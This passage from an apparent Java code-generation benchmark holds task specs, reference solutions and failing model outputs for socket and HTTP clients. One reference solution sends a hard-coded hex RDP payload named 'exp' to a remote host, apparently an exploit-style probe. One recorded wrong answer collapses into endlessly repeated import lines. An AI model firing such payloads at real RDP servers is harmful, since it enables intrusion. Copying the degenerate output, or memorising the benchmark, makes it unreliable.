metricFamilySamples.samples) {\n        m.reset(sample.name);\n        writer.write(m.replaceAll(\"_\"));\n        for (int i = 0; i < sample.labelNames.size(); ++i) {\n          m.reset(sample.labelValues.get(i));\n          writer.write(\";\" + sample.labelNames.get(i) + \"=\" + m.replaceAll(\"_\"));\n        }\n        writer.write(\" \" + sample.value + \" \" + now + \"\\n\");\n      }\n    }\n    writer.close();\n    s.close();\n  }\n\n  public Thread start(CollectorRegistry registry) {\n    return start(registry, 60);\n  }\n\n  public Thread start(CollectorRegistry registry, int intervalSeconds) {\n    Thread thread = new PushThread(registry, intervalSeconds);\n    thread.setDaemon(true);\n    thread.start();\n    return thread;\n  }\n\n  private class PushThread extends Thread {\n    private final CollectorRegistry registry;\n    private final int intervalSeconds;\n\n    PushThread(CollectorRegistry registry, int intervalSeconds) {\n      this.registry = registry;\n      this.intervalSeconds = intervalSeconds;\n    }\n\n    public void run() {\n      long waitUntil = System.currentTimeMillis();\n      while (true) {\n        try {\n          push(registry);\n        } catch (IOException e) {\n          logger.log(Level.WARNING, \"Exception \" + e + \" pushing to \" + host + \":\" + port, e);\n        }\n\n        long now = System.currentTimeMillis();\n        while (now >= waitUntil) {\n          waitUntil += intervalSeconds * 1000;\n        }\n        try {\n          Thread.sleep(waitUntil - now);\n        } catch (InterruptedException e) {\n          return;\n        }\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class Graphite {\n    private final String host;\n    private final int port;\n    private final java.util.logging.Logger logger;\n    private final java.util.regex.Pattern INVALID_GRAPHITE_CHARS;\n\n    public Graphite(String host, int port, java.util.logging.Logger logger) {\n        this.host = host;\n        this.port = port;\n        this.logger = logger;\n        this.INVALID_GRAPHITE_CHARS = java.util.regex.Pattern.compile(\"[^a-zA-Z0-9._-]\");\n    }\n\n    public void push(com.codahale.metrics.CollectorRegistry registry) throws java.io.IOException {\n        try (java.net.Socket socket = new java.net.Socket(host, port)) {\n            try (java.io.OutputStream outputStream = socket.getOutputStream();\n                 java.io.PrintWriter writer = new java.io.PrintWriter(outputStream, true)) {\n                for (com.codahale.metrics.MetricFamilySamples metricFamily : registry.getMetricFamilySamples()) {\n                    String metricName = metricFamily.getName();\n                    String sanitizedName = sanitize(metricName);\n                    for (com.codahale.metrics.MetricFamilySamples.Sample sample : metricFamily.getSamples()) {\n                        double value = sample.getValue();\n                        long timestamp = System.currentTimeMillis() / 1000;\n                        String line = sanitizedName + \" \" + value + \" \" + timestamp;\n                        writer.println(line);\n                    }\n                }\n            }\n        } catch (java.io.IOException e) {\n            logger.severe(\"Failed to push metrics to Graphite\");\n            throw e;\n        }\n    }\n\n    private String sanitize(String name) {\n        return INVALID_GRAPHITE_CHARS.matcher(name).replaceAll(\"_\");\n    }\n\n    public java.lang.Thread start(com.codahale.metrics.CollectorRegistry registry) {\n        return start(registry, 60);\n    }\n\n    public java.lang.Thread start(com.codahale.metrics.CollectorRegistry registry, int intervalSeconds) {\n        PushThread thread = new PushThread(registry, intervalSeconds);\n        thread.setDaemon(true);\n        thread.start();\n        return thread;\n    }\n\n    private class PushThread extends java.lang.Thread {\n        private final com.codahale.metrics.CollectorRegistry registry;\n        private final int intervalSeconds;\n\n        PushThread(com.codahale.metrics.CollectorRegistry registry, int intervalSeconds) {\n            this.registry = registry;\n            this.intervalSeconds = intervalSeconds;\n        }\n\n        @Override\n        public void run() {\n            while (true) {\n                try {\n                    push(registry);\n                    java.lang.Thread.sleep(intervalSeconds * 1000);\n                } catch (java.lang.InterruptedException e) {\n                    java.lang.Thread.currentThread().interrupt();\n                    break;\n                } catch (java.io.IOException e) {\n                    logger.severe(\"Error pushing metrics to Graphite\");\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 407,
    "Instruction": "Task Description: Create a Java class that acts as a TCP client within a servlet context, handling HTTP requests by forwarding them to a specified server via TCP and returning the server's response.\n\nClass Description: The Lisplet class extends HttpServlet to handle HTTP POST requests. It establishes a TCP connection to a specified host and port, sends the HTTP request data in a custom format, processes the server's response, and returns it to the client.\n\nAttributes:\n- host: String - The hostname or IP address of the TCP server to connect to\n- port: int - The port number of the TCP server to connect to\n\nMethods:\n- doPost(HttpServletRequest req, HttpServletResponse resp) -> void - Handles HTTP POST requests by establishing a TCP connection, sending the request, processing the response, and closing the connection\n- transferResponseBody(HttpServletResponse resp, PushbackInputStream strm) -> void - Transfers the response body from the server to the HTTP response output stream\n- getResponseHeader(HttpServletRequest req, HttpServletResponse resp, PushbackInputStream strm) -> boolean - Reads and processes the response header from the server\n- sendRequest(HttpServletRequest req, Writer writer) -> void - Formats and sends the HTTP request data to the server\n- writeTagValuePair(Writer writer, String tag, String value) -> void - Helper method to write tag-value pairs in the custom request format",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\nimport javax.servlet.http.*;\n\npublic class Lisplet extends HttpServlet {\n    private String host;\n    private int port;\n\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp)\n            throws ServletException, IOException {\n        Socket socket = new Socket(host, port);\n        try {\n            Writer writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n            sendRequest(req, writer);\n            PushbackInputStream strm = new PushbackInputStream(\n                    new BufferedInputStream(socket.getInputStream()));\n            if(getResponseHeader(req, resp, strm))\n                transferResponseBody(resp, strm);\n        } finally {\n            socket.close();\n        }\n    }\n\n    protected void transferResponseBody(HttpServletResponse resp, PushbackInputStream strm)\n            throws ServletException, IOException {\n        OutputStream outs = resp.getOutputStream();\n        int b;\n        while((b = strm.read()) != -1)\n            outs.write(b);\n        outs.flush();\n    }\n\n    protected boolean getResponseHeader(HttpServletRequest req, HttpServletResponse resp, PushbackInputStream strm)\n        throws ServletException, IOException {\n        ArrayList list = readSexpr(strm);\n        return processResponse(req, resp, list);\n    }\n\n    protected void sendRequest(HttpServletRequest req, Writer writer)\n            throws IOException {\n        writer.write(\"(\");\n        writeTagValuePair(writer, \"method\", req.getMethod());\n        writeTagValuePair(writer, \"uri\", req.getRequestURI());\n        writeTagValuePair(writer, \"protocol\", req.getProtocol());\n        writer.write(\")\");\n        writer.flush();\n    }\n\n    protected void writeTagValuePair(Writer writer, String tag, String value)\n            throws IOException {\n        writer.write(\"(\");\n        writer.write(tag);\n        writer.write(\" \");\n        writer.write(\"\\\"\");\n        writer.write(value.replaceAll(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\",\"\\\\\\\\\\\"\"));\n        writer.write(\"\\\"\");\n        writer.write(\")\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class Lisplet extends HttpServlet {\n    private String host;\n    private int port;\n\n    @Override\n    public void init() throws ServletException {\n        super.init();\n        host = getInitParameter(\"host\");\n        port = Integer.parseInt(getInitParameter(\"port\"));\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        try {\n            Socket socket = new Socket(host, port);\n            OutputStream outputStream = socket.getOutputStream();\n            Writer writer = new OutputStreamWriter(outputStream);\n            sendRequest(req, writer);\n            PushbackInputStream strm = new PushbackInputStream(socket.getInputStream());\n            if (!getResponseHeader(req, resp, strm)) {\n                resp.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, \"Failed to read response header\");\n                return;\n            }\n            transferResponseBody(resp, strm);\n            socket.close();\n        } catch (IOException e) {\n            resp.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, \"TCP connection failed: \" + e.getMessage());\n        }\n    }\n\n    private void sendRequest(HttpServletRequest req, Writer writer) throws IOException {\n        writeTagValuePair(writer, \"METHOD\", req.getMethod());\n        writeTagValuePair(writer, \"PATH\", req.getRequestURI());\n        writeTagValuePair(writer, \"HTTP_VERSION\", req.getProtocol());\n        Enumeration<String> headerNames = req.getHeaderNames();\n        while (headerNames.hasMoreElements()) {\n            String headerName = headerNames.nextElement();\n            String headerValue = req.getHeader(headerName);\n            writeTagValuePair(writer, headerName, headerValue);\n        }\n        InputStream reqInputStream = req.getInputStream();\n        byte[] buffer = new byte[1024];\n        int length;\n        while ((length = reqInputStream.read(buffer)) != -1) {\n            writer.write(new String(buffer, 0, length));\n        }\n        writer.flush();\n    }\n\n    private boolean getResponseHeader(HttpServletRequest req, HttpServletResponse resp, PushbackInputStream strm) throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(strm));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            if (line.trim().isEmpty()) {\n                break;\n            }\n            String[] parts = line.split(\": \", 2);\n            if (parts.length == 2) {\n                String headerName = parts[0];\n                String headerValue = parts[1];\n                resp.setHeader(headerName, headerValue);\n            }\n        }\n        return true;\n    }\n\n    private void transferResponseBody(HttpServletResponse resp, PushbackInputStream strm) throws IOException {\n        byte[] buffer = new byte[1024];\n        int length;\n        while ((length = strm.read(buffer)) != -1) {\n            resp.getOutputStream().write(buffer, 0, length);\n        }\n        resp.getOutputStream().flush();\n    }\n\n    private void writeTagValuePair(Writer writer, String tag, String value) throws IOException {\n        writer.write(tag + \": \" + value + \"\\n\");\n    }\n}"
  },
  {
    "Task_id": 408,
    "Instruction": "Task Description: Create a Java class that implements a TCP client for basic communication with a server using Java's IO and networking capabilities.\n\nClass Description: The HelloClient class establishes a TCP connection to a specified server, receives messages from the server, and properly closes the connection when done. It uses Java's Socket and BufferedReader for network communication.\n\nAttributes:\n- client: Socket - The socket object representing the connection to the server\n- buf: BufferedReader - The buffered reader for receiving data from the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port\n  - Input: \n    - host: String - The server hostname or IP address\n    - port: int - The server port number\n  - Throws: Exception - If connection fails\n- receive() -> String - Reads a line of text from the server\n  - Returns: String - The received message from the server\n  - Throws: Exception - If reading fails\n- close() -> void - Closes the connection and cleans up resources\n  - Throws: Exception - If closing fails",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.Socket;\n\npublic class HelloClient {\n\n    private Socket client;\n    private BufferedReader buf;\n\n    public void connect(String host, int port) throws Exception {\n        client = new Socket(host, port);\n        InputStreamReader inputStreamReader = new InputStreamReader(client.getInputStream());\n        buf = new BufferedReader(inputStreamReader);\n    }\n\n    public String receive() throws Exception {\n        String str = buf.readLine();\n        return str;\n    }\n\n    public void close() throws Exception {\n        buf.close();\n        client.close();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class HelloClient {\n    private Socket client;\n    private BufferedReader buf;\n\n    public void connect(String host, int port) throws Exception {\n        client = new Socket(host, port);\n        buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n    }\n\n    public String receive() throws Exception {\n        return buf.readLine();\n    }\n\n    public void close() throws Exception {\n        if (client != null) {\n            client.close();\n        }\n        if (buf != null) {\n            buf.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 409,
    "Instruction": "Task Description: Create a Java function that sends a raw RDP (Remote Desktop Protocol) connection request to a specified host and port using TCP socket communication. The function should handle the socket connection, data transmission, and proper resource cleanup.\n\nFunction Description: The function establishes a TCP connection to a specified remote host and port, sends a pre-defined hexadecimal RDP protocol payload, and then closes the connection. The function includes error handling for connection issues and implements a socket timeout to prevent hanging.\n\nInput:\n- rhost: String - The remote host IP address or hostname to connect to\n- rport: int - The remote port number for the RDP service\n\nOutput: None (void function), though errors will be printed to standard error if they occur\n\nNote: The function uses a static hexadecimal string (exp) containing the RDP protocol payload, which is converted to bytes before transmission. The socket timeout is set to 3 milliseconds to prevent prolonged connection attempts.",
    "Canonical_solution": "import java.net.Socket;\nimport java.io.OutputStream;\n\npublic static String exp = \"030000130ee000000000000100080000000000030001d602f0807f658201940401010401010101ff30190204000000000204000000020204000000000204000000010204000000000204000000010202ffff020400000002301902040000000102040000000102040000000102040000000102040000000002040000000102020420020400000002301c0202ffff0202fc170202ffff0204000000010204000000000204000000010202ffff02040000000204820133000500147c0001812a000800100001c00044756361811c01c0d800040008008002e00101ca03aa09040000ce0e000048004f005300540000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca010000000000100007000100300030003000300030002d003000300030002d0030003000300030003000300030002d003000300030003000300000000000000000000000000000000000000000000000000004c00c000d0000000000000002c00c001b0000000000000003c02c0003000000726470647200000000008080636c6970726472000000a0c0726470736e640000000000c00300000c02f08004010001000300000802f080280300000c02f08038000603ef0300000c02f08038000603eb0300000c02f08038000603ec0300000c02f08038000603ed0300000c02f08038000603ee0300000b06d00000123400\";\n\npublic void sendRDPRequest(String rhost, int rport) {\n    try {\n        byte[] bytes = HexUtils.hex2Bytes(exp);\n        Socket socket = new Socket(rhost, rport);\n        socket.setSoTimeout(3);\n        OutputStream out = socket.getOutputStream();\n        out.write(bytes);\n        out.flush();\n        out.close();\n        socket.close();\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class RdpSender {\n    private static final String EXP = \"00000000000000000000000000000000\";\n\n    public static void sendRdpRequest(String rhost, int rport) {\n        try {\n            Socket socket = new Socket();\n            socket.connect(new InetSocketAddress(rhost, rport), 3);\n            socket.setSoTimeout(3);\n            byte[] payload = hexToBytes(EXP);\n            OutputStream os = socket.getOutputStream();\n            os.write(payload);\n            os.flush();\n            socket.close();\n        } catch (IOException e) {\n            System.err.println(\"Error: \" + e.getMessage());\n        }\n    }\n\n    private static byte[] hexToBytes(String hex) {\n        int len = hex.length();\n        byte[] bytes = new byte[len / 2];\n        for (int i = 0; i < len; i += 2) {\n            bytes[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)\n                                 + Character.digit(hex.charAt(i + 1), 16));\n        }\n        return bytes;\n    }\n}"
  },
  {
    "Task_id": 41,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for interacting with the OpenMHz API, including methods for testing connection authorization and uploading audio recordings with metadata.\n\nClass Description: OpenMHzHttpClient is a utility class that provides HTTP client operations for the OpenMHz API. It handles both synchronous and asynchronous requests, manages connection settings, and processes API responses. The class includes error handling and logging capabilities.\n\nAttributes:\n- mLog: Logger - SLF4J logger instance for error and debug logging\n- mHttpClient: HttpClient - Configured HTTP client instance with HTTP/2 support, redirect policy, and timeout settings\n\nMethods:\n- testConnection(String host, String systemName, String apiKey) -> String - Tests API connection and authorization by sending a POST request to the authorize endpoint. Returns status messages based on response code.\n  Input:\n    - host: String - Base URL of the OpenMHz server\n    - systemName: String - Name of the target system\n    - apiKey: String - API key for authentication\n  Output:\n    - String - Status message (\"OK\", \"Invalid API Key\", \"Invalid System Name\", \"No Response\", or \"Unknown Exception\")\n\n- sendAudioRecording(String uri, byte[] audioBytes, String boundary, String apiKey, long frequency, long timestampSeconds, int durationSeconds, String talkgroup, String radioId) -> void - Asynchronously uploads an audio recording with metadata to the OpenMHz API using multipart/form-data format.\n  Input:\n    - uri: String - Target endpoint URL\n    - audioBytes: byte[] - Audio file data to upload\n    - boundary: String - Multipart boundary string\n    - apiKey: String - API key for authentication\n    - frequency: long - Frequency value in Hz\n    - timestampSeconds: long - Recording start time in seconds\n    - durationSeconds: int - Recording duration in seconds\n    - talkgroup: String - Talkgroup identifier\n    - radioId: String - Radio source identifier\n  Output: None (asynchronous operation with error logging)",
    "Canonical_solution": "import com.google.common.net.HttpHeaders;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\nimport java.util.concurrent.CompletionException;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class OpenMHzHttpClient {\n\n    private final static Logger mLog = LoggerFactory.getLogger(OpenMHzHttpClient.class);\n    private HttpClient mHttpClient = HttpClient.newBuilder()\n        .version(HttpClient.Version.HTTP_2)\n        .followRedirects(HttpClient.Redirect.NORMAL)\n        .connectTimeout(Duration.ofSeconds(20))\n        .build();\n\n    public String testConnection(String host, String systemName, String apiKey) {\n        String uri = host + \"/\" + systemName + \"/authorize\";\n\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(uri))\n            .header(HttpHeaders.CONTENT_TYPE, \"application/x-www-form-urlencoded\")\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .POST(HttpRequest.BodyPublishers.ofString(\"api_key=\" + apiKey))\n            .build();\n\n        try {\n            HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n\n            if (response.statusCode() == 200) {\n                return \"OK\";\n            } else if(response.statusCode() == 403) {\n                return \"Invalid API Key\";\n            } else if(response.statusCode() == 500) {\n                return \"Invalid System Name\";\n            }\n\n            return \"No Response\";\n        }\n        catch(Exception e) {  \n            Throwable throwableCause = e.getCause();\n\n            if(throwableCause instanceof ConnectException) {\n                return \"No Response\";\n            }\n\n            mLog.error(\"Exception connecting to OpenMHz server [\" + e.toString() + \"]\");\n            return \"Unknown Exception\";\n        }\n    }\n\n    public void sendAudioRecording(String uri, byte[] audioBytes, String boundary, String apiKey, long frequency, \n                                  long timestampSeconds, int durationSeconds, String talkgroup, String radioId) {\n        OpenMHzBuilder bodyBuilder = new OpenMHzBuilder();\n        bodyBuilder\n            .addFile(audioBytes)\n            .addPart(FormField.FREQ, frequency)\n            .addPart(FormField.START_TIME, timestampSeconds)\n            .addPart(FormField.STOP_TIME, timestampSeconds)\n            .addPart(FormField.CALL_LENGTH, durationSeconds)\n            .addPart(FormField.TALKGROUP_NUM, talkgroup)\n            .addPart(FormField.EMERGENCY, 0)\n            .addPart(FormField.API_KEY, apiKey)\n            .addPart(FormField.SOURCE_LIST, \"[{ \\\"pos\\\": 0.00, \\\"src\\\": \" + radioId + \"}]\");\n\n        HttpRequest fileRequest = HttpRequest.newBuilder()\n            .uri(URI.create(uri))\n            .header(HttpHeaders.CONTENT_TYPE, \"multipart/form-data; boundary=\" + boundary)\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .POST(bodyBuilder.build())\n            .build();\n\n        mHttpClient.sendAsync(fileRequest, HttpResponse.BodyHandlers.ofString())\n            .whenComplete((fileResponse, throwable1) -> {\n                if(throwable1 != null || fileResponse.statusCode() != 200) {\n                    if(throwable1 instanceof IOException || throwable1 instanceof CompletionException) {\n                        mLog.error(\"OpenMHz API file upload fail [\" +\n                            fileResponse.statusCode() + \"] response [\" +\n                            fileResponse.body() + \"]\");\n                    }\n                    else {\n                        mLog.error(\"OpenMHz API file upload fail [\" +\n                            fileResponse.statusCode() + \"] response [\" +\n                            fileResponse.body() + \"]\");\n                    }\n                }\n            });\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "import org.apache.http.client.methods.HttpPost;\nimport org.apache.http.client.config.RequestConfig;\nimport org.apache.http.impl.client.CloseableHttpClient;\nimport org.apache.http.impl.client.HttpClients;\nimport org.apache.http.entity.ContentType;\nimport org.apache.http.entity.StringEntity;\nimport org.apache.http.entity.mime.MultipartEntityBuilder;\nimport org.apache.http.entity.mime.content.ByteArrayBody;\nimport org.apache.http.entity.mime.content.FileBody;\nimport org.apache.http.util.EntityUtils;\nimport org.apache.http.HttpResponse;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpGet;\nimport org.apache.http.client.methods.HttpPost;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport org.apache.http.client.methods.HttpRequestBase;\nimport 